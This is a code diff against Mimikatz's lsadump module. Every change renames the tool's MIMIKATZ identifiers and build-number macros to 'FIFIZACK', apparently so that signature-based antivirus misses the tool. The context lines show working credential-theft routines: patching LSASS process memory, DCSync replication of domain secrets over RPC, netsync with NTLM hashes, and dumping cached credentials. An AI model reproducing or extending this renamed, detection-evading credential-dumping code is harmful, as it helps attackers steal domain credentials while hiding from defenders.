@@ -118,7 +118,7 @@ NTSTATUS kuhl_m_lsadump_secretsOrCache(int argc, wchar_t * argv[], BOOL secretsO
 			}
 			if(!hashStatus)
 			{
-				kull_m_string_args_byName(argc, argv, L"password", &szPassword, MIMIKATZ);
+				kull_m_string_args_byName(argc, argv, L"password", &szPassword, FIFIZACK);
 				kprintf(L"  * password : %s\n", szPassword);
 				RtlInitUnicodeString(&uPassword, szPassword);
 				hashStatus = NT_SUCCESS(RtlDigestNTLM(&uPassword, cacheData.ntlm));
@@ -1014,7 +1014,7 @@ NTSTATUS kuhl_m_lsadump_lsa(int argc, wchar_t * argv[])
 	
 	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
 	{
-		if(currentSamSrvReference = kull_m_patch_getGenericFromBuild(SamSrvReferences, ARRAYSIZE(SamSrvReferences), MIMIKATZ_NT_BUILD_NUMBER))
+		if(currentSamSrvReference = kull_m_patch_getGenericFromBuild(SamSrvReferences, ARRAYSIZE(SamSrvReferences), FIFIZACK_NT_BUILD_NUMBER))
 		{
 			aPatternMemory.address = currentSamSrvReference->Search.Pattern;
 			aPatchMemory.address = currentSamSrvReference->Patch.Pattern;
@@ -1397,14 +1397,14 @@ NTSTATUS kuhl_m_lsadump_trust(int argc, wchar_t * argv[])
 
 	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
 	{
-		if(currentReference = kull_m_patch_getGenericFromBuild(QueryInfoTrustedDomainReferences, ARRAYSIZE(QueryInfoTrustedDomainReferences), MIMIKATZ_NT_BUILD_NUMBER))
+		if(currentReference = kull_m_patch_getGenericFromBuild(QueryInfoTrustedDomainReferences, ARRAYSIZE(QueryInfoTrustedDomainReferences), FIFIZACK_NT_BUILD_NUMBER))
 		{
 			aPatternMemory.address = currentReference->Search.Pattern;
 			aPatchMemory.address = currentReference->Patch.Pattern;
 
 			if(kuhl_m_lsadump_lsa_getHandle(&hMemory, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION))
 			{
-				if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, (MIMIKATZ_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"lsasrv.dll" : L"lsadb.dll", &iModule))
+				if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, (FIFIZACK_NT_BUILD_NUMBER < KULL_M_WIN_BUILD_8) ? L"lsasrv.dll" : L"lsadb.dll", &iModule))
 				{
 					sMemory.kull_m_memoryRange.kull_m_memoryAdress = iModule.DllBase;
 					sMemory.kull_m_memoryRange.size = iModule.SizeOfImage;
@@ -1726,7 +1726,7 @@ NTSTATUS kuhl_m_lsadump_dcsync(int argc, wchar_t * argv[])
 					kprintf(L"[DC] \'%s\' will be the user account\n", szUser);
 
 				kull_m_string_args_byName(argc, argv, L"altservice", &szService, L"ldap");
-				if(kull_m_rpc_createBinding(NULL, L"ncacn_ip_tcp", szDc, NULL, szService, TRUE, (MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, kull_m_rpc_drsr_RpcSecurityCallback))
+				if(kull_m_rpc_createBinding(NULL, L"ncacn_ip_tcp", szDc, NULL, szService, TRUE, (FIFIZACK_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_IMP_LEVEL_DEFAULT, &hBinding, kull_m_rpc_drsr_RpcSecurityCallback))
 				{
 					if(kull_m_rpc_drsr_getDomainAndUserInfos(&hBinding, szDc, szDomain, &getChReq.V8.uuidDsaObjDest, szUser, szGuid, &dsName.Guid, &DrsExtensionsInt))
 					{
@@ -2161,7 +2161,7 @@ NTSTATUS kuhl_m_lsadump_netsync(int argc, wchar_t * argv[])
 		if(kull_m_string_args_byName(argc, argv, L"user", &szUser, NULL))
 		{
 			kull_m_string_args_byName(argc, argv, L"account", &szAccount, szUser);
-			kull_m_string_args_byName(argc, argv, L"computer", &szComputer, MIMIKATZ);
+			kull_m_string_args_byName(argc, argv, L"computer", &szComputer, FIFIZACK);
 			if(kull_m_string_args_byName(argc, argv, L"ntlm", &szNtlm, NULL))
 			{
 				if(kull_m_string_stringToHex(szNtlm, ntlmHash, sizeof(ntlmHash)))
